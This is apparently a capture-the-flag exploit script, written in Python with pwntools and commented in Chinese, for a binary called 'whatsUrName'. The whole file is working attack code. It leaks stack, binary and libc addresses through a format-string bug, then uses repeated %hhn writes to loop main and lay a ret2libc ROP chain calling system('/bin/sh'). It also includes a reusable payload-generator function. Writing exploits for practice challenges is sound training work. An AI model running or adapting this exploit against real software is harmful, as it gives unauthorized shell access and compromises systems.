#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 1
if LOCAL:
    io = process("./whatsUrName")
else:
    remote_service = "ctf.nbs.jonbgua.com 32131"
    remote_service = remote_service.strip().split(" ")
    io = remote(remote_service[0], int(remote_service[1]))


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

# 这个函数可以重用作为格式化字符串类题目的轮子
current_n = 0
def generate_hhn_payload(distance, hhn_data):
    global current_n
    offset = (distance // 8) + 6
    if hhn_data > current_n:
        temp = hhn_data - current_n
    elif hhn_data < current_n:
        temp = 0x100 - current_n + hhn_data
    elif hhn_data == current_n:
        return b"%" + i2b(offset) + b"hhn"
    current_n = hhn_data
    return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"

#ru(b":")
#sl(input("YOUR TOKEN: ").encode())

debugPID()
ru(b"What's your name?\n");
current_n = 0
payload = b"%40$p.%41$p.%43$p."
sl(payload)
#  input()
stack_buf = int(ru(b".", "drop"), 16) - 0x120
elf_base  = int(ru(b".", "drop"), 16) - 0x1307
libc_base = int(ru(b".", "drop"), 16) - 0x29d90
lg("stack_buf")
lg("elf_base")
lg("libc_base")
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload = generate_hhn_payload(0xc0, 2)   # 这里构造出循环使程序返回 main 函数
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)

pop_rdi_ret = libc_base + 0x000000000002a3e5
ret_addr    = pop_rdi_ret + 1
bin_sh_str  = libc_base + 0x1d8698
system_addr = libc_base + 331104
pop_rsi_ret = libc_base + 0x0000000000053150
#pop_rdx_ret = libc_base + 0x0000000000053150
pop_rax_ret = libc_base + 0x0000000000045eb0
syscall_ret = libc_base + 0x0000000000140ffb
#  bin_sh_str  = libc_base + next(libc.search(b"/bin/sh\x00"))
#  system_addr = libc_base + libc.sym["system"]

# 接下来就是常规构造 ROP 了
# 目标是在栈上布置能够 getshell 的 ROP 链（参考 [参考 1-3 ret2libc]）
# 最后再写返回地址为 ret 触发

# 现在相当于每次循环时有两次触发格式化字符串漏洞的机会
## 第一次改返回地址构造循环
ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
## 第二次向下写入数据
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload = generate_hhn_payload(0xc0,  ( (pop_rdi_ret) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (pop_rdi_ret >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (pop_rdi_ret >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (pop_rdi_ret >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (pop_rdi_ret >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (pop_rdi_ret >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 24 + 0x118)
payload += p64(stack_buf + 24 + 0x119)
payload += p64(stack_buf + 24 + 0x11a)
payload += p64(stack_buf + 24 + 0x11b)
payload += p64(stack_buf + 24 + 0x11c)
payload += p64(stack_buf + 24 + 0x11d)
sl(payload)


'''
重复上面的步骤第一步构造循环第二步写入 ROP 链
'''


ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((bin_sh_str) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (bin_sh_str >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (bin_sh_str >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (bin_sh_str >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (bin_sh_str >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (bin_sh_str >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 16 + 0x118)
payload += p64(stack_buf + 16 + 0x119)
payload += p64(stack_buf + 16 + 0x11a)
payload += p64(stack_buf + 16 + 0x11b)
payload += p64(stack_buf + 16 + 0x11c)
payload += p64(stack_buf + 16 + 0x11d)
sl(payload)

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((system_addr) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (system_addr >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (system_addr >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (system_addr >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (system_addr >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (system_addr >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 8 + 0x118)
payload += p64(stack_buf + 8 + 0x119)
payload += p64(stack_buf + 8+ 0x11a)
payload += p64(stack_buf + 8 + 0x11b)
payload += p64(stack_buf + 8 + 0x11c)
payload += p64(stack_buf + 8 + 0x11d)
sl(payload)

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((ret_addr) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (ret_addr >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (ret_addr >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (ret_addr >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (ret_addr >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (ret_addr >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0 + 0x118)
payload += p64(stack_buf + 0 + 0x119)
payload += p64(stack_buf + 0 + 0x11a)
payload += p64(stack_buf + 0 + 0x11b)
payload += p64(stack_buf + 0 + 0x11c)
payload += p64(stack_buf + 0 + 0x11d)
sl(payload)

ia()


